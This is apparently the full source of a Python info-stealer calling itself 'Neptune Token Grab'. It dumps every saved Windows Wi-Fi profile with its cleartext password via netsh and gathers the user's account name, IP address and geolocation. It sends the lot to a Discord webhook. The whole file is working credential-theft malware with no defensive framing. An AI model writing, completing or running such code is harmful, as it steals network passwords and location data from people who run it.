import os

try :   
    from discord_webhook import DiscordWebhook ,DiscordEmbed
    import socket
    import requests
    import datetime
    import subprocess
except :
    os.system("pip install discord-webhook")
    os.system("pip install socket")
    os.system("pip install requests")
    os.system("pip install datetime")

    os.system('cls')

    from discord_webhook import DiscordWebhook ,DiscordEmbed
    import socket
    import requests
    import datetime
    import subprocess

wifi_list = []

data = os.popen("netsh wlan show profile").read()
profile_names = [i.split(":")[1].strip() for i in data.split("\n") if "Profil" in i and ":" in i]

for name in profile_names:
    wifi_data = os.popen("netsh wlan show profile name=\"{}\" key=clear".format(name)).read()
    wifi_key = [i.split(":")[1].strip() for i in wifi_data.split("\n") if "Contenu de la cl" in i and ":" in i]
    if wifi_key:
        wifi_list.append(name + ": " + wifi_key[0])

Wifi_Infos = "\n".join(wifi_list)

user_windows = os.getenv("USERNAME")
ip = socket.gethostbyname(socket.gethostname())

r = requests.get(url= f'http://ip-api.com/json/' )
query = r.json()

if query and query['status'] == 'success' : 
    postal = query['zip']
    country = query['country']
    city = query['city']

print("   _______                 __                       ")
print("   \      \   ____ _______/  |_ __ __  ____   ____  ")
print("   /   |   \_/ __ \\____ \   __\  |  \/    \_/ __ \ ")
print("  /    |    \  ___/|  |_> >  | |  |  /   |  \  ___/ ")
print("  \____|__  /\___  >   __/|__| |____/|___|  /\___  >")
print("          \/     \/|__|                   \/     \/ ")

webhook = DiscordWebhook(url='URL-Webhook', username="Neptune")

embed = DiscordEmbed(
    title="Neptune Token Grab", description=f"Time :**{datetime.datetime.today()}**\n\n**Windows Information**\n\nWindows Account Username :**{user_windows}**\nIp :**{ip}**\n\n**Localisation**\n\nCountry :**{str(country)}**\nCity :**{str(city)}**\nPostal Code :**{postal}**\n\n**Wifi Infos**\n\n```{Wifi_Infos}```"
)
webhook.add_embed(embed)

response = webhook.execute()
